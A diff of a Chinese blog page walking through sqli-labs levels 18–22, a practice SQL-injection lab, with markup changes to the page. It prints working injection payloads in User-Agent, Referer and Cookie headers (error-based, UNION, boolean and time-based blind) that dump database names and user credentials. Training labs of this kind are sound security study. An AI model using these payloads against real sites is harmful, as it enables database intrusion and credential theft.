@@ -194,7 +194,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      17
+      16
        分钟
     </span>
   
@@ -227,94 +227,127 @@
             <h1 style="display: none">sqli-labs（四）</h1>
             
             <div class="markdown-body">
-              <h1 id="Less-18"><a href="#Less-18" class="headerlink" title="Less-18"></a>Less-18</h1><p>基于错误的用户代理，头部POST注入.</p>
+              <h1>Less-18</h1>
+<p>基于错误的用户代理，头部POST注入.</p>
 <p>补充几个请求头：</p>
 <blockquote>
 <ul>
-<li><code>Host</code><br> Host请求报头域主要用于指定被请求资源的Internet主机和端口号。</li>
-<li><code>User-Agent</code><br> User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。</li>
-<li><code>Referer</code><br> Referer包含一个URL，代表当前访问URL的上一个URL。</li>
-<li><code>Cookie</code><br> Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。</li>
-<li><code>Range</code><br> Range可以请求实体的部分内容。</li>
-<li><code>X-Forwarded-For</code><br> X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。</li>
-<li><code>Accept</code><br> Accept请求报头域用于指定客户端接收哪些<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tjudzj/p/6528008.html">MIME类型</a>的信息。</li>
-<li><code>Accept-Charset</code><br> Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。</li>
+<li><code>Host</code><br>
+Host请求报头域主要用于指定被请求资源的Internet主机和端口号。</li>
+<li><code>User-Agent</code><br>
+User-Agent请求报头域允许客户端将它的操作系统、浏览器和其他属性告诉服务器。</li>
+<li><code>Referer</code><br>
+Referer包含一个URL，代表当前访问URL的上一个URL。</li>
+<li><code>Cookie</code><br>
+Cookie是非常重要的请求头，它是一段文本，常用来表示请求者身份等。</li>
+<li><code>Range</code><br>
+Range可以请求实体的部分内容。</li>
+<li><code>X-Forwarded-For</code><br>
+X-Forwarded-For即XXF头，它代表请求端的IP，可以有多个，中间以逗号隔开。</li>
+<li><code>Accept</code><br>
+Accept请求报头域用于指定客户端接收哪些<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tjudzj/p/6528008.html">MIME类型</a>的信息。</li>
+<li><code>Accept-Charset</code><br>
+Accept-Charset请求报头域用于指定客户端接收的字符集。如果在请求消息中没有设置这个域，默认是任何字符集都可以接收。</li>
 </ul>
 </blockquote>
-<h4 id="查找注入点"><a href="#查找注入点" class="headerlink" title="查找注入点"></a>查找注入点</h4><p>在用户名和密码注入都只回显最初的ip地址，查找源代码</p>
+<h4 id="查找注入点"><a class="header-anchor" href="#查找注入点">🍭</a>查找注入点</h4>
+<p>在用户名和密码注入都只回显最初的ip地址，查找源代码</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/1.jpg" srcset="/img/loading.gif" alt="1"></p>
 <p>本关对用户名和密码做了check_input()处理，故无法注入。但在用admin登录成功时发现页面有user agent 信息猜测可在其注入，但由于这里执行的语句是insert,所以不能像之前一样用#将后面的语句给注释掉。当#注释掉后面就无法正常插入执行 SQL语句。</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/2.jpg" srcset="/img/loading.gif" alt="2"></p>
 <p>查找源代码验证了猜测</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/3.jpg" srcset="/img/loading.gif" alt="3"></p>
-<p>注意:这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。<strong>17关对密码进行了更改,故此处记得用新密码，或者在靶场初页面重置，否则无法登录</strong>，本人用admin登录了半天登不进去，后来才反应过来17关改密码了…………</p>
+<p>注意:这里要输入正确的账号和密码才能绕过账号密码判断，进入处理<code>User-Agent</code>部分。<strong>17关对密码进行了更改,故此处记得用新密码，或者在靶场初页面重置，否则无法登录</strong>，本人用admin登录了半天登不进去，后来才反应过来17关改密码了…</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/4.jpg" srcset="/img/loading.gif" alt="4"></p>
-<h3 id="（一）hackbar插件"><a href="#（一）hackbar插件" class="headerlink" title="（一）hackbar插件:"></a>（一）hackbar插件:</h3><h3 id="extractvalue（）"><a href="#extractvalue（）" class="headerlink" title="extractvalue（）"></a>extractvalue（）</h3><h4 id="1-试探"><a href="#1-试探" class="headerlink" title="1.试探"></a>1.试探</h4><p>先试单引号</p>
+<h3 id="（一）hackbar插件"><a class="header-anchor" href="#（一）hackbar插件">🍭</a>（一）hackbar插件:</h3>
+<h3 id="extractvalue（）"><a class="header-anchor" href="#extractvalue（）">🍭</a>extractvalue（）</h3>
+<h4 id="1-试探"><a class="header-anchor" href="#1-试探">🍭</a>1.试探</h4>
+<p>先试单引号</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/7.jpg" srcset="/img/loading.gif" alt="7"></p>
 <p>报错，再闭合，回显正常</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/6.jpg" srcset="/img/loading.gif" alt="6"></p>
 <p>查看源代码确定为单引号注入。</p>
-<h4 id="2-爆库"><a href="#2-爆库" class="headerlink" title="2.爆库"></a>2.爆库</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select database()),0x7e)) or &#39;1&#39;=&#39;1</code></p>
+<h4 id="2-爆库"><a class="header-anchor" href="#2-爆库">🍭</a>2.爆库</h4>
+<p><code>' or extractvalue(1,concat(0x7e,(select database()),0x7e)) or '1'='1</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/5.jpg" srcset="/img/loading.gif" alt="5"></p>
-<h4 id="3-爆表"><a href="#3-爆表" class="headerlink" title="3.爆表"></a>3.爆表</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables and table_schema=database()))) or &#39;1&#39;=&#39;1</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/8.jpg" srcset="/img/loading.gif" alt="8"></p>
-<h4 id="4-爆列"><a href="#4-爆列" class="headerlink" title="4.爆列"></a>4.爆列</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;)))  or &#39;1&#39;=&#39;1</code></p>
+<h4 id="3-爆表"><a class="header-anchor" href="#3-爆表">🍭</a>3.爆表</h4>
+<p><code>' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from  information_schema.tables and table_schema=database()))) or '1'='1</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/8.jpg" srcset="/img/loading.gif" alt="8"></p>
+<h4 id="4-爆列"><a class="header-anchor" href="#4-爆列">🍭</a>4.爆列</h4>
+<p><code>' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users' and table_schema='security')))  or '1'='1</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/9.jpg" srcset="/img/loading.gif" alt="9"></p>
-<h4 id="5-爆值"><a href="#5-爆值" class="headerlink" title="5.爆值"></a>5.爆值</h4><p><code>&#39; or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))  or&#39;1&#39;=&#39;1 </code><img src="/2020/11/26/sqli-labs%E5%9B%9B/10.jpg" srcset="/img/loading.gif" alt="10"></p>
+<h4 id="5-爆值"><a class="header-anchor" href="#5-爆值">🍭</a>5.爆值</h4>
+<p><code>' or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))  or'1'='1 </code><img src="/2020/11/26/sqli-labs%E5%9B%9B/10.jpg" srcset="/img/loading.gif" alt="10"></p>
 <p>遇到之前的老问题数据显示不全，可用limit0,1;来遍历或者使用not in()：</p>
-<p><code>&#39; or extractvalue(1,concat(0x7e,(select  group_concat(username,0x3a,password) from users where username not in  (&#39;Dumb&#39;,&#39;Angelinal&#39;)))) or &#39; </code></p>
+<p><code>' or extractvalue(1,concat(0x7e,(select  group_concat(username,0x3a,password) from users where username not in  ('Dumb','Angelinal')))) or ' </code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/11.jpg" srcset="/img/loading.gif" alt="11"></p>
 <p>不过这种方法也很麻烦。</p>
 <p>updatexml()类似。</p>
-<h3 id="floor"><a href="#floor" class="headerlink" title="floor():"></a>floor():</h3><p><code>&#39; and (select 1 from (select  count(*),concat_ws(&#39;-&#39;,(select user()),floor(rand()*2))as a from  information_schema.tables group by a) b)  and &#39;</code></p>
+<h3 id="floor"><a class="header-anchor" href="#floor">🍭</a>floor():</h3>
+<p><code>' and (select 1 from (select  count(*),concat_ws('-',(select user()),floor(rand()*2))as a from  information_schema.tables group by a) b)  and '</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/12.jpg" srcset="/img/loading.gif" alt="12"></p>
 <p>也可使用时间盲注。</p>
-<h3 id="二-HTTP-Header-Live"><a href="#二-HTTP-Header-Live" class="headerlink" title="(二)HTTP Header Live"></a>(二)HTTP Header Live</h3><p>HTTP Header Live是Firefox中的插件，可在其中对user-agent 进行修改。</p>
-<h3 id><a href="#" class="headerlink" title></a><img src="/2020/11/26/sqli-labs%E5%9B%9B/13.jpg" srcset="/img/loading.gif" alt="13"></h3><h3 id="（三）Live-HTTP-headers"><a href="#（三）Live-HTTP-headers" class="headerlink" title="（三）Live HTTP headers"></a>（三）Live HTTP headers</h3><p>Live HTTP headers也是Firefox里的插件，但是需要安装低版本火狐，测试安装的是45.0版本浏览器。这篇博客有详细教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_22146195/article/details/103537148">火狐浏览器安装Live HTTP headers步骤记录</a></p>
-<h3 id="四-Burp-Suite"><a href="#四-Burp-Suite" class="headerlink" title="(四)Burp Suite"></a>(四)Burp Suite</h3><p>Burp Suite 是用于攻击web 应用程序的集成平台，包含许多工具,且这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。<strong>安装burp suite需要java环境</strong></p>
+<h3 id="二-HTTP-Header-Live"><a class="header-anchor" href="#二-HTTP-Header-Live">🍭</a>(二)HTTP Header Live</h3>
+<p>HTTP Header Live是Firefox中的插件，可在其中对user-agent 进行修改。</p>
+<h3 id="13"><a class="header-anchor" href="#13">🍭</a><img src="/2020/11/26/sqli-labs%E5%9B%9B/13.jpg" srcset="/img/loading.gif" alt="13"></h3>
+<h3 id="（三）Live-HTTP-headers"><a class="header-anchor" href="#（三）Live-HTTP-headers">🍭</a>（三）Live HTTP headers</h3>
+<p>Live HTTP headers也是Firefox里的插件，但是需要安装低版本火狐，测试安装的是45.0版本浏览器。这篇博客有详细教程：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_22146195/article/details/103537148">火狐浏览器安装Live HTTP headers步骤记录</a></p>
+<h3 id="四-Burp-Suite"><a class="header-anchor" href="#四-Burp-Suite">🍭</a>(四)Burp Suite</h3>
+<p>Burp Suite 是用于攻击web 应用程序的集成平台，包含许多工具,且这些工具设计了许多接口，以加快攻击应用程序的过程。所有工具都共享一个请求，并能处理对应的HTTP 消息、持久性、认证、代理、日志、警报。<strong>安装burp suite需要java环境</strong></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/14.jpg" srcset="/img/loading.gif" alt="14"></p>
 <p>类似工具还有很多不一一列举。</p>
-<h1 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h1><p>基于头部的Referer POST报错注入</p>
+<h1>Less-19</h1>
+<p>基于头部的Referer POST报错注入</p>
 <p>成功登陆后会显示referer地址,用户名与18关一样用函数进行处理，故在referer注入。与18关类似。</p>
 <p>仍可用HTTP Header Live：</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/15.jpg" srcset="/img/loading.gif" alt="15"></p>
 <p>Burp Suite：</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/16.jpg" srcset="/img/loading.gif" alt="16"></p>
-<h1 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h1><p>基于错误的cookie头部POST注入</p>
+<h1>Less-20</h1>
+<p>基于错误的cookie头部POST注入</p>
 <p>从源代码中我们可以看到cookie从username获得值之后，当再次刷新时会从cookie中获取username,然后进行查询。</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/18.jpg" srcset="/img/loading.gif" alt="18"></p>
 <p>因为此关为post注入，可使用union联合语句，报错语句。</p>
-<h2 id="法一：union联合语句"><a href="#法一：union联合语句" class="headerlink" title="法一：union联合语句"></a>法一：union联合语句</h2><h4 id="1-试探-1"><a href="#1-试探-1" class="headerlink" title="1.试探"></a>1.试探</h4><p>从上图源代码中可以看出本关为单引号注入，也可以试探一下：</p>
+<h2 id="法一：union联合语句"><a class="header-anchor" href="#法一：union联合语句">🍭</a>法一：union联合语句</h2>
+<h4 id="1-试探-v2"><a class="header-anchor" href="#1-试探-v2">🍭</a>1.试探</h4>
+<p>从上图源代码中可以看出本关为单引号注入，也可以试探一下：</p>
 <p>单引号报错</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/19.jpg" srcset="/img/loading.gif" alt="19"></p>
 <p>注释掉回显正常</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/20.jpg" srcset="/img/loading.gif" alt="20"></p>
-<h4 id="2-判断字段数与回显字段"><a href="#2-判断字段数与回显字段" class="headerlink" title="2.判断字段数与回显字段"></a>2.判断字段数与回显字段</h4><p>使用burp suite抓个包：</p>
-<p><code>uname=admin&#39; order by 4 -- #</code></p>
+<h4 id="2-判断字段数与回显字段"><a class="header-anchor" href="#2-判断字段数与回显字段">🍭</a>2.判断字段数与回显字段</h4>
+<p>使用burp suite抓个包：</p>
+<p><code>uname=admin' order by 4 -- #</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/21.jpg" srcset="/img/loading.gif" alt="21"></p>
 <p>4报错，3回显正常。其实和第一关如出一辙。</p>
-<p><code>uname=1&#39; union select 1,2,3 -- #</code></p>
+<p><code>uname=1' union select 1,2,3 -- #</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/22.jpg" srcset="/img/loading.gif" alt="22"></p>
-<p>之后就是查库，查表，查列，查值……不再赘述。</p>
-<h2 id="法二：floor"><a href="#法二：floor" class="headerlink" title="法二：floor()"></a>法二：floor()</h2><p><code>uname=1&#39; or (select 1 from (select 1,count(*),concat_ws(&#39;-&#39;,(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)-- #</code></p>
+<p>之后就是查库，查表，查列，查值…不再赘述。</p>
+<h2 id="法二：floor"><a class="header-anchor" href="#法二：floor">🍭</a>法二：floor()</h2>
+<p><code>uname=1' or (select 1 from (select 1,count(*),concat_ws('-',(select database()),floor(rand()*2))as a from information_schema.tables group by a) b)-- #</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/23.jpg" srcset="/img/loading.gif" alt="23"></p>
-<h2 id="法三：updatexml-注入，extractvalue-注入"><a href="#法三：updatexml-注入，extractvalue-注入" class="headerlink" title="法三：updatexml()注入，extractvalue()注入"></a>法三：updatexml()注入，extractvalue()注入</h2><p><code>uname=1&#39; or updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e),0)-- #</code></p>
+<h2 id="法三：updatexml-注入，extractvalue-注入"><a class="header-anchor" href="#法三：updatexml-注入，extractvalue-注入">🍭</a>法三：updatexml()注入，extractvalue()注入</h2>
+<p><code>uname=1' or updatexml(1,concat(0x7e,(select group_concat(table_name)  from information_schema.tables where table_schema=database()),0x7e),0)-- #</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/24.jpg" srcset="/img/loading.gif" alt="24"></p>
-<h2 id="法四：布尔盲注"><a href="#法四：布尔盲注" class="headerlink" title="法四：布尔盲注"></a>法四：布尔盲注</h2><p><code>uname=admin&#39; and left((select database()),8)=&#39;security&#39;-- #</code></p>
+<h2 id="法四：布尔盲注"><a class="header-anchor" href="#法四：布尔盲注">🍭</a>法四：布尔盲注</h2>
+<p><code>uname=admin' and left((select database()),8)='security'-- #</code></p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/27.jpg" srcset="/img/loading.gif" alt="27"></p>
 <p>报错时页面：</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/26.jpg" srcset="/img/loading.gif" alt="26"></p>
-<h2 id="法五：延时注入"><a href="#法五：延时注入" class="headerlink" title="法五：延时注入"></a>法五：延时注入</h2><p><code>uname=admin&#39; and if(length(database())=8,1,sleep(5))-- #</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/28.jpg" srcset="/img/loading.gif" alt="28"></p>
+<h2 id="法五：延时注入"><a class="header-anchor" href="#法五：延时注入">🍭</a>法五：延时注入</h2>
+<p><code>uname=admin' and if(length(database())=8,1,sleep(5))-- #</code><img src="/2020/11/26/sqli-labs%E5%9B%9B/28.jpg" srcset="/img/loading.gif" alt="28"></p>
 <p>用burp suite 抓包报错会一直延时，hackbar正常延时，报错页面如下：</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/29.jpg" srcset="/img/loading.gif" alt="29"></p>
-<h1 id="Less-21"><a href="#Less-21" class="headerlink" title="Less-21"></a>Less-21</h1><p>基于base64编码单引号和括号的Cookie注入</p>
+<h1>Less-21</h1>
+<p>基于base64编码单引号和括号的Cookie注入</p>
 <p>本关和Less-20相似，cookie从username获得值之后，再次刷新时会从cookie中获取username,再进行查询,只是cookie的uname值需经过base64编码。</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/32.jpg" srcset="/img/loading.gif" alt="32"></p>
 <p>推荐一个编码器<a target="_blank" rel="noopener" href="https://base64.us/">Base64 在线编码解码</a>，admin的编码为YWRtaW4=</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/31.jpg" srcset="/img/loading.gif" alt="31"></p>
 <p>单引号报错：</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/33.jpg" srcset="/img/loading.gif" alt="33"></p>
-<p><code>&#39;)</code>也报错，用#注释后回显正常。其余操作与20关相同，将命令编码即可。</p>
-<h1 id="Less-22"><a href="#Less-22" class="headerlink" title="Less-22"></a>Less-22</h1><p>登录成功后显示的是21关的图片，应该是作者弄错了。</p>
+<p><code>')</code>也报错，用#注释后回显正常。其余操作与20关相同，将命令编码即可。</p>
+<h1>Less-22</h1>
+<p>登录成功后显示的是21关的图片，应该是作者弄错了。</p>
 <p>双引号报错</p>
 <p><img src="/2020/11/26/sqli-labs%E5%9B%9B/34.jpg" srcset="/img/loading.gif" alt="34"></p>
 <p>注释后回显正常</p>
